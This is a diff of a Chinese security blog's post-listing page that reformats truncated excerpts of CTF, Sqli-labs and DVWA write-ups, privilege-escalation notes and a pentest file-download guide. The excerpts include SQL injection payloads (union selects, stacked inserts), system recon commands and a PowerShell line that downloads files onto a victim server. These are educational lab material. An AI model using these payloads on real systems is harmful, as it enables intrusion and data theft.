@@ -72,7 +72,8 @@
 information_schemainnodb_tables_stats
 大小写对于大小写敏感的 WAF ，可以用大小写绕过
 全大写、大小写混写
-mysql&gt; select 1,2,3 union select * from users;+----+----------+-------...
+mysql&gt; select 1,2,3 union select * from users;
++----+----------+------...
                                         </p>
                                     </div>
                                 </li>
@@ -121,7 +122,9 @@ bypass
                                             PHP2进入题目后只有一句话： Can you anthenticate to this website?  ，没有其他东西，扫描目录页无果。尝试在index.phps，得到源码
 
 但是显然代码并不完整，右键查看源代码，得到如下
-&lt;?phpif("admin"===$_GET[id]) &#123;  echo("&lt;p&gt;not allowed!&lt;/p&gt;");  ...
+&lt;?php
+if(&quot;admin&quot;===$_GET[id]) {
+  echo(&quot;&lt;p&gt;not allowed!&lt...
                                         </p>
                                     </div>
                                 </li>
@@ -177,7 +180,9 @@ https://downloads.joomla.org/it/cms/joomla3/3-4-6
 攻击机：Kali（IP：192.168.199.133）
 靶机：LazySysAdmin（IP：192.168.199.136）
 渗透测试Netdiscover扫描网段，发现靶机IP地址
-netdiscover -r 192.168.199.0/24Currently scanning: Finished!...
+netdiscover -r 192.168.199.0/24
+
+Currently scanning: Finishe...
                                         </p>
                                     </div>
                                 </li>
@@ -193,9 +198,14 @@ netdiscover -r 192.168.199.0/24Currently scanning: Finished!...
                                         <p>
                                             本文转载自原文：Linux 提权常用命令集
 0x00 操作系统相关操作系统类型版本
-cat /etc/issuecat /etc/*-releasecat /etc/lsb-release      # Debian cat /etc/redhat-release   # Redhat
+cat /etc/issue
+cat /etc/*-release
+cat /etc/lsb-release      # Debian 
+cat /etc/redhat-release   # Redhat
 内核版本，是否是64位
-getconf LONG_BITcat /proc/versionuname -a...
+getconf LONG_BIT
+cat /proc/version
+una...
                                         </p>
                                     </div>
                                 </li>
@@ -250,7 +260,8 @@ exploit-db的详情：https://www.exploit-db.com/exploits/39574/
                                             本文转载自原文：13种方式下载文件
 渗透测试过程中常常遇到需要将文件下载到受害者服务器上，这里介绍15种下载文件的方式，希望能帮助到你。
 0x01 Powershell创建如下PSH脚本：
-$p = New-Object System.Net.WebClient$p.DownloadFile("http://domain/file","C:%homepath%file")如：$p.Downl...
+$p = New-Object System.Net.WebClient
+$p.DownloadFile(&quot;http://domain/file&quot;,&quot;C:%homepath%...
                                         </p>
                                     </div>
                                 </li>
@@ -391,7 +402,11 @@ DC-1环境虚拟机平台：VMware Workstation Pro
                                         <a class="timeline-title" target="_self" href="knlvre.github.io/2019/09/03/CTF比赛—2019XNUCA — ezphpWriteUp/">2019XNUCA — ezphp WriteUp</a>
                                         <p>
                                             前言没有参加本次比赛，只记录ezphp这一道题目，把同学的Writeup复现并记录下来
-ezphp源代码&lt;?php 	$files = scandir('./');	foreach($files as $file)&#123;		if($file !== "index.php")&#123;			unlink($file);		&#125;	&#125;	include_onece("...
+ezphp源代码&lt;?php 
+    $files = scandir(&#39;./&#39;);
+    foreach($files as $file){
+        if($file !== &quot;index.php&quot;){
+            unlink($file...
                                         </p>
                                     </div>
                                 </li>
@@ -407,9 +422,11 @@ ezphp源代码&lt;?php 	$files = scandir('./');	foreach($files as $file)&#123;		
                                         <p>
                                             Web服务器安装与配置Apache2和php组件的安装使用如下命令来安装Apache2和php的组件
 Ps：如果只安装Apache2，将会导致写的php文件无法被解析
-apt-get install apache2apt-get install php
+apt-get install apache2
+apt-get install php
 
-命令状态：/etc/init.d/apache2 status（service apache2 status）开启：/etc/init.d...
+命令状态：/etc/init.d/apache2 status（service apache2 status）
+开启：/etc/init...
                                         </p>
                                     </div>
                                 </li>
@@ -477,7 +494,10 @@ Web1. Game题目进去是一个游戏机，只有Shuffle和Stop两个按钮可�
 查看源码，其他没什么用，但是发现一个js文件（cqg.js），点击查看源代码
 
 在末尾发现了关键代码
-if(score == 15)&#123;    $.ajax(&#123;        url: 'score.php',        type...
+if(score == 15){
+    $.ajax({
+        url: &#39;score.php&#39;,
+        typ...
                                         </p>
                                     </div>
                                 </li>
@@ -500,7 +520,16 @@ if(score == 15)&#123;    $.ajax(&#123;        url: 'score.php',        type...
                                         <a class="timeline-title" target="_self" href="knlvre.github.io/2019/07/26/CTF比赛—2019ISCC线下赛WriteUp/">2019 ISCC — 线下赛WriteUp</a>
                                         <p>
                                             前言本次比赛的赛程安排是上午解题，下午AWD。算是真正意义上第一次参加AWD比赛，记录一下学习的内容
-PWNimport stringdic = string.printableflag = ''pair = [    0x17F5B345,0x17F5B30C,    0xF16B77E2,0xF16B77B1,    0xB2B21947,2998016260,    0x58A9F98...
+PWNimport string
+
+dic = string.printable
+
+flag = &#39;&#39;
+
+pair = [
+    0x17F5B345,0x17F5B30C,
+    0xF16B77E2,0xF16B77B1,
+    0xB2B21947,2998016...
                                         </p>
                                     </div>
                                 </li>
@@ -527,7 +556,10 @@ PWNimport stringdic = string.printableflag = ''pair = [    0x17F5B345,0x17F5B30C
 将一整串二进制转换为十六进制，发现开头是rar文件的开头
 
 直接保存成一个rar文件
-import binasciis = "010100100110000101110010001000010001101000000111...这里就不全写出来，自行补充即可"s = hex(int(int(s...
+import binascii
+s = &quot;010100100110000101110010001000010001101000000111...这里就不全写出来，自行补充即可&quot;
+
+s = ...
                                         </p>
                                     </div>
                                 </li>
@@ -597,7 +629,9 @@ flag{oho_oho_oho}
                                             前一部分链接：第21-30关Write-up
 第三十一关（md5 collision(NUPT_CTF)）我打开题目是没有给任何提示的，只有链接进去提示&quot;please input a&quot;，源代码也没有写任何东西
 去找别人的WriteUp，别人做题可以看到提示代码：
-&lt;?php$md51 = md5('QNKCDZO');$a = @$_GET['a'];$md52 =...
+&lt;?php
+$md51 = md5(&#39;QNKCDZO&#39;);
+$a = @$_GET[&#...
                                         </p>
                                     </div>
                                 </li>
@@ -619,7 +653,17 @@ flag{oho_oho_oho}
                                     <div class="timeline-content">
                                         <a class="timeline-title" target="_self" href="knlvre.github.io/2019/03/30/BugKuCTF—杂项题中常见的文件操作/">BugKuCTF — 杂项题中常见的文件知识点和操作</a>
                                         <p>
-                                            常见的文件头JPEG (jpg)，文件头：FF D8 FF E0PNG (png)，文件头：89 50 4E 47；文件尾：00 00 00 00 49 45 4E 44 AE 42 60 827z：37 7A BC AF 27 1CGIF (gif)：47 49 46 38 39 61ZIP Archive (zip)：50 4B 03 04RAR Archive (rar)：52 61 ...
+                                            常见的文件头JPEG (jpg)，文件头：FF D8 FF E0
+
+PNG (png)，文件头：89 50 4E 47；文件尾：00 00 00 00 49 45 4E 44 AE 42 60 82
+
+7z：37 7A BC AF 27 1C
+
+GIF (gif)：47 49 46 38 39 61
+
+ZIP Archive (zip)：50 4B 03 04
+
+RAR Archive (r...
                                         </p>
                                     </div>
                                 </li>
@@ -641,7 +685,7 @@ flag{oho_oho_oho}
 联合注入测试成功
 
 爆数据库、表、列、flag值
--1&apos; union select 1,2,3,table_name from infor...
+-1&#39; union select 1,2,3,table_name from inform...
                                         </p>
                                     </div>
                                 </li>
@@ -721,7 +765,8 @@ flag直接解出来
 此时，页面多刷新几次，机会看到提示：value变量
 
 -写代码：
-import requestsimport r...
+import requests
+import ...
                                         </p>
                                     </div>
                                 </li>
@@ -736,16 +781,16 @@ import requestsimport r...
                                         <a class="timeline-title" target="_self" href="knlvre.github.io/2019/03/15/Kali学习笔记/">Kali学习笔记</a>
                                         <p>
                                             1. 常用命令grep：就前面执行后显示的内容进行筛选（egrep相反）
-命令 | grep ["XXX"]
-awk：筛选第X行的内容
-命令 | awk ["X"]
-cut：裁剪内容，-d 表示分割的标志，-f 接第几部分
-命令 | cut -d ["X"] -f [X]
+命令 | grep [&quot;XXX&quot;]
 
-ls：列出当前目录下内容（Window下是：dir）
-ls [-l/-a/-h...]
-cd：切换位置
-cd [/et...
+awk：筛选第X行的内容
+命令 | awk [&quot;X&quot;]
+
+cut：裁剪内容，-d 表示分割的标志，-f 接第几部分
+命令 | cut -d [&quot;X&quot;] -f [X]
+
+
+ls：列出当前目录下内容（Window下是：dir）...
                                         </p>
                                     </div>
                                 </li>
@@ -759,9 +804,13 @@ cd [/et...
                                     <div class="timeline-content">
                                         <a class="timeline-title" target="_self" href="knlvre.github.io/2019/03/14/MySQL5数据库配置与管理/">Mysql数据库</a>
                                         <p>
-                                            （一）数据库安全【Tip】Grant：授予Privilege： 特权Revoke：废除Anonymous：匿名的Recurse：递归
+                                            （一）数据库安全【Tip】Grant：授予
+Privilege： 特权
+Revoke：废除
+Anonymous：匿名的
+Recurse：递归
 【原理】​    （1）数据库系统分为内部安全性和外部安全性。
-​    （2）内部安全性关心的是文件系统级的问题，既防止Mysql数据目录（DATADIR）被在服务器主机有账号的人（合法或盗取的）进行攻击。如果数据目录内容的权限过分授予，使得每个人均能简单地...
+​    （2）内部安全性关心的是文件系统级的问题，既防止Mysql数据目录（DATADIR）被在服务器主机有账号的人（合法或盗取的）进行攻击。如果数据目录内容的权限过分授予，使得每个人均...
                                         </p>
                                     </div>
                                 </li>
@@ -800,9 +849,15 @@ cd [/et...
                                         <a class="timeline-title" target="_self" href="knlvre.github.io/2019/03/12/SQL注入详解/">SQL注入详解</a>
                                         <p>
                                             （一）基础知识点union查询（1）系统函数
-version()：mysql版本user()：数据库用户名database()：当前数据库名@@datadir：数据库路径@@version_compile_os：当前操作系统
+version()：mysql版本
+user()：数据库用户名
+database()：当前数据库名
+@@datadir：数据库路径
+@@version_compile_os：当前操作系统
 （2）Mysql默认设置
-information_schema.schemate：默认数据库information_schema.tables：默认数据表informa...
+information_schema.schemate：默认数据库
+information_schema.tables：默认数据表
+i...
                                         </p>
                                     </div>
                                 </li>
@@ -1054,7 +1109,13 @@ document表示的是一个文档对象，window表示的是一个窗口对象...
 页面功能输入一个ID，返回该ID的信息
 
 Security Level — Low核心代码
-&lt;?phpif( isset( $_REQUEST[ 'Submit' ] ) ) &#123;	// Get input	$id = $_REQUEST[ 'id' ];	// Check database	$quer...
+&lt;?php
+
+if( isset( $_REQUEST[ &#39;Submit&#39; ] ) ) {
+    // Get input
+    $id = $_REQUEST[ &#39;id&#39; ];
+
+ ...
                                         </p>
                                     </div>
                                 </li>
@@ -1091,7 +1152,11 @@ Secur...
 页面功能上传本地文件到服务器
 
 Security Level — Low核心代码
-&lt;?phpif( isset( $_POST[ 'Upload' ] ) ) &#123;	// Where are we going to be writing to?	$target_path  = DVWA_WEB_PA...
+&lt;?php
+
+if( isset( $_POST[ &#39;Upload&#39; ] ) ) {
+    // Where are we going to be writing to?
+    $target_path  ...
                                         </p>
                                     </div>
                                 </li>
@@ -1128,7 +1193,11 @@ Security Level — Low核心代码
 页面功能更改当前用户的密码
 
 Security Level — Low核心代码
-&lt;?phpif( isset( $_GET[ 'Change' ] ) ) &#123;	// Get input	$pass_new  = $_GET[ 'password_new' ];	$pass_conf = $_GET[ ...
+&lt;?php
+
+if( isset( $_GET[ &#39;Change&#39; ] ) ) {
+    // Get input
+    $pass_new  = $_GET[ &#39;password_new&#39; ];...
                                         </p>
                                     </div>
                                 </li>
@@ -1146,7 +1215,11 @@ Security Level — Low核心代码
 页面功能可以在我们输入一个IP地址之后，帮我们Ping这个地址并返回结果
 
 Security Level — Low核心代码
-&lt;?phpif( isset( $_POST[ 'Submit' ]  ) ) &#123;	// Get input	$target = $_REQUEST[ 'ip' ];	// D...
+&lt;?php
+
+if( isset( $_POST[ &#39;Submit&#39; ]  ) ) {
+    // Get input
+    $target = $_REQUEST[...
                                         </p>
                                     </div>
                                 </li>
@@ -1164,7 +1237,13 @@ Security Level — Low核心代码
 页面功能输入用户名密码登录
 
 Security Level — Low核心代码
-&lt;?phpif( isset( $_GET[ 'Login' ] ) ) &#123;	// Get username	$user = $_GET[ 'username' ];	// Get password	$pass = $_G...
+&lt;?php
+
+if( isset( $_GET[ &#39;Login&#39; ] ) ) {
+    // Get username
+    $user = $_GET[ &#39;username&#39; ];
+
+    /...
                                         </p>
                                     </div>
                                 </li>
@@ -1180,10 +1259,10 @@ Security Level — Low核心代码
                                         <p>
                                             前一部分链接：第41-50关Write-up
 Less-51与前一关相同，单引号包裹，payload
-?sort=1&apos;;create table less51 like users--+
+?sort=1&#39;;create table less51 like users--+
 Less-52与Less-50相同，只不过没有报错信息回显，payload
 ?sort=1;create table less51 like users--+
-Less-53与Less-51相同，...
+Less-53与Less-51相同，只...
                                         </p>
                                     </div>
                                 </li>
@@ -1199,8 +1278,8 @@ Less-53与Less-51相同，...
                                         <p>
                                             前一部分链接：第31-40关Write-up
 Less-41与Less-39一样，只是没有报错信息，称之为盲注。测试完知道是整形注入，payload
-?id=1;insert into users(id,username,password) values(&apos;37&apos;,&apos;users37&apos;,&apos;password37&apos;);--+
-Less-4...
+?id=1;insert into users(id,username,password) values(&#39;37&#39;,&#39;users37&#39;,&#39;password37&#39;);--+
+Less-42本关通过P...
                                         </p>
                                     </div>
                                 </li>
@@ -1217,10 +1296,10 @@ Less-4...
                                             前一部分链接：第21-30关Write-up
 Less-31Less-32本关开始，考查的是宽字节注入的利用，关于宽字节注入的知识点可以看我的文章Sqli-labs Tips的Tip 4 
 我们提交以下payload时，发现单引号&#39;被转义了
-?id=1&apos;
+?id=1&#39;
 
 查看源码，发现使用了check_addslashes()函数对id进行了处理
-$id=check_addslashes...
+$id=check_addslashes(...
                                         </p>
                                     </div>
                                 </li>
@@ -1269,7 +1348,9 @@ Base64加密一下payload：
                                             前一部分链接：第1-10关Write-up
 前言之前其他资料学习过程中，学会一个挺好用的学习技巧
 在源码中$sql变量下方加入以下内容
-echo &quot;&lt;br&gt;&quot;.&quot;==================================================&quot;.&quot;&lt;/br&gt;&quot;;echo $sql;echo...
+echo &quot;&lt;br&gt;&quot;.&quot;==================================================&quot;.&quot;&lt;/br&gt;&quot;;
+echo $sql;
+ec...
                                         </p>
                                     </div>
                                 </li>
@@ -1300,9 +1381,20 @@ echo &quot;&lt;br&gt;&quot;.&quot;==============================================
                                         <a class="timeline-title" target="_self" href="knlvre.github.io/2019/01/28/Sqli-labs Tips/">Sqli-labs Tips</a>
                                         <p>
                                             Tip 1 —— 基础知识点（1）简单的用于尝试的语句
-or 1=1--+&apos;or 1=1--+&quot;or 1=1--+)or 1=1--+&apos;)or 1=1--+&quot;) or 1=1--+&quot;))or 1=1--+ps:--+和#可以互相替换
+or 1=1--+
+&#39;or 1=1--+
+&quot;or 1=1--+
+)or 1=1--+
+&#39;)or 1=1--+
+&quot;) or 1=1--+
+&quot;))or 1=1--+
+
+ps:--+和#可以互相替换
 （2）mysql命令行的简单命令
-查看所有的数据库show databases;使用某个数据库(比如secur...
+查看所有的数据库
+show databases;
+
+使用某个数据...
                                         </p>
                                     </div>
                                 </li>
